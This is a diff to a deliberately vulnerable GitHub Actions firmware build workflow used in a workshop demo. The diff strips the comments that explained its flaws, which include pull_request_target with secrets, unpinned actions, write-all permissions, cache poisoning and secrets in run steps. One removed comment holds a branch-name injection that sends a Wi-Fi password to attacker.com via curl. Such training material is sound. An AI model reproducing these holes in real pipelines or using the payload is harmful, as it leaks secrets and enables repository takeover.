@@ -1,14 +1,6 @@
 # =============================================================================
 # WORKSHOP DEMO — intentionally vulnerable firmware build pipeline
 # DO NOT USE IN PRODUCTION
-#
-# Vulnerabilities present (zizmor audit rules triggered):
-#   1. dangerous-triggers      — pull_request_target with secrets in scope
-#   2. template-injection      — PR branch name injected raw into shell
-#   3. unpinned-uses           — mutable tags on all actions
-#   4. excessive-permissions   — write-all at workflow level
-#   5. secrets-outside-env     — secrets interpolated directly into run:
-#   6. artipacked              — checkout persists git credentials to artifact
 # =============================================================================
 
 name: Firmware build (VULNERABLE — workshop demo)
@@ -16,47 +8,33 @@ name: Firmware build (VULNERABLE — workshop demo)
 on:
   push:
     branches: [main]
-  pull_request_target:                  # VULN 1: runs with base branch secrets
-    types: [opened, synchronize]        # even for fork PRs
+  pull_request_target:                  
+    types: [opened, synchronize]        
 
-permissions: write-all                  # VULN 2: grants full repo write access
+permissions: write-all                  
 
 jobs:
   sast-and-build:
     runs-on: ubuntu-latest
 
     steps:
-      # VULN 3: @v3 tag is mutable — can be silently replaced after compromise
       - name: Checkout code
         uses: actions/checkout@v3
         with:
-          # Checks out attacker-controlled code in base context (pwn request)
           ref: ${{ github.event.pull_request.head.sha }}
 
       - name: Set up Python
-        uses: actions/setup-python@v4    # VULN 3: also unpinned
+        uses: actions/setup-python@v4    
 
       - name: Install PlatformIO
         run: pip install platformio
 
 
-      # VULN 7: weak cache key — no hash of platformio.ini
-      # An attacker who poisons the cache for key "pio-Linux" on one PR
-      # has that poisoned cache served to every subsequent PR on the same OS,
-      # including to protected branches. The stale/malicious packages persist
-      # until a cache key collision naturally evicts them.
-      # Combined with pull_request_target (VULN 1), a fork PR can write a
-      # backdoored cache entry that runs with base-branch secrets on merge.
       - name: Cache PlatformIO packages
-        uses: actions/cache@v3          # VULN 3: also mutable/unpinned
+        uses: actions/cache@v3          
         with:
           path: ~/.platformio
-          key: pio-${{ runner.os }}     # VULN 7: no hashFiles('platformio.ini')
-                                        # Secure version would be:
-                                        # key: pio-${{ runner.os }}-${{ hashFiles('platformio.ini') }}
-
-      # VULN 2+4: PR title and branch name flow directly into shell unquoted.
-      # Attacker names branch: x"; curl https://attacker.com?k=$D_WIFI_PASS; echo "
+          key: pio-${{ runner.os }}     
       - name: Log build info
         run: |
           echo "Building PR: ${{ github.event.pull_request.title }}"
@@ -66,10 +44,7 @@ jobs:
       - name: Run SAST (clang-tidy via PlatformIO)
         run: pio check --environment m5stick-c --severity low
 
-      # VULN 5: secrets interpolated directly into run: — visible in logs and
-      # exfiltrable by any step. PlatformIO picks them up via sysenv.* but
-      # the ${{ secrets.* }} expression is evaluated by GitHub before the shell
-      # sees the script, making the values trivially extractable.
+      
       - name: Build firmware
         run: |
           D_WIFI_SSID="${{ secrets.WIFI_SSID }}" \
@@ -78,10 +53,9 @@ jobs:
           GITHUB_TOKEN="${{ secrets.GITHUB_TOKEN }}" \
           pio run --environment m5stick-c
 
-      # VULN 6: checkout@v3 persists git credentials in .git/config
-      # upload-artifact then bundles .git/ — credentials leak in the artifact
+      
       - name: Upload firmware binary
-        uses: actions/upload-artifact@v4   # VULN 3: also unpinned
+        uses: actions/upload-artifact@v4   
         with:
           name: firmware-m5stick
           path: |
